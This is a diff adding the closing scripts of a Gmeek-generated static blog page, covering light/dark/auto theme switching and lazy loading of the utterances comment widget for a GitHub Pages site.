+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","yixunblog/yixunblog.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+
+
+</script>
+
+
+</html>
